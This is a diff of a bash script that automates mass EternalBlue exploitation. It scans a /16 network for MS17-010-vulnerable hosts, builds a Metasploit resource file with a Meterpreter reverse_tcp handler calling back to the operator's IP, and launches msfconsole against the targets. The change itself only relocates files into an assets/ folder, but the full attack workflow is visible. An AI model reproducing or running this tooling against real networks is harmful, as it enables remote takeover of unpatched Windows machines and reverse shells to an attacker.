@@ -17,13 +17,16 @@ if [[ $EUID -ne 0 ]]; then
    exit 1;
 fi
 
+assetsdir="assets/";
 # cloning scanner from the github repo
-if [ ! -d "eternal_scanner" ]; then
-    git clone https://github.com/peterpt/eternal_scanner.git;
-    chmod +x eternal_scanner/escan;
+if [ ! -d "assets/eternal_scanner" ]; then
+    git clone https://github.com/peterpt/eternal_scanner.git "$assetsdir"eternal_scanner;
+    chmod +x assets/eternal_scanner/escan;
 else 
-    chmod +x eternal_scanner/escan;
+    chmod +x assets/eternal_scanner/escan;
 fi
+
+
 
 # read necessary infos from the user
 read -p 'YOUR IP: ' yourIP;
@@ -47,18 +50,18 @@ if [ ! -f /usr/local/share/Eternal_Scanner/vuln.txt ]; then
     echo "";
     echo "SCANNER STARTING...";
     echo "";
-    cd eternal_scanner 
+    cd assets/eternal_scanner 
     ./escan -i $ip1.$ip2.0.0/16
-    cd ..
+    cd ../..
     echo "";
     echo "Parsing IPs...";
-    python3 ipparser.py &
+    python3 "$assetsdir"ipparser.py &
 
 else
     echo "No scanner needed due to the file ";
     echo "/usr/local/share/Eternal_Scanner/vuln.txt";
-    echo "EXISTS";
-    python3 ipparser.py &
+    echo "vuln.txt FOUND";
+    python3 "$assetsdir"ipparser.py &
     echo "";
     echo "Parsing IPs...";
 
@@ -69,15 +72,15 @@ if [ -z $port ]; then
     port="31313";
 fi
 
-echo "use exploit/multi/handler" > nsa.rb;
-echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> nsa.rb;
-echo "set autorunscript multi_console_command -rc nsa.rc" >> nsa.rb
-echo "set lhost" $yourIP >> nsa.rb
-echo "set lport" $port >> nsa.rb
-echo "set ExitOnSession false" >> nsa.rb
-echo "exploit -j" >> nsa.rb
-echo "use exploit/windows/smb/ms17_010_eternalblue" >> nsa.rb;
-echo "set VerifyArch false" >> nsa.rb;
+echo "use exploit/multi/handler" > "$assetsdir"nsa.rb;
+echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> "$assetsdir"nsa.rb;
+echo "set autorunscript multi_console_command -rc assets/nsa.rc" >>"$assetsdir"nsa.rb;
+echo "set lhost" $yourIP >> "$assetsdir"nsa.rb;
+echo "set lport" $port >> "$assetsdir"nsa.rb;
+echo "set ExitOnSession false" >> "$assetsdir"nsa.rb;
+echo "exploit -j" >> "$assetsdir"nsa.rb;
+echo "use exploit/windows/smb/ms17_010_eternalblue" >> "$assetsdir"nsa.rb;
+echo "set VerifyArch false" >> "$assetsdir"nsa.rb;
 
 # echo "";
 # echo "PLEASE COPY THE TARGET IP";
@@ -103,7 +106,7 @@ if [ "$check" == "y" ] || [ "$check" == "yes" ]; then
     echo "";
     echo "Running please wait..."; 
     # msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST $yourIP;set LPORT $port;set RHOST $targetIP;set VerifyArch false;exploit;"
-    msfconsole -r iter.rc
+    msfconsole -r assets/iter.rc
 else
     echo "Not Proceeded, USER EXIT"; exit 1;
 fi
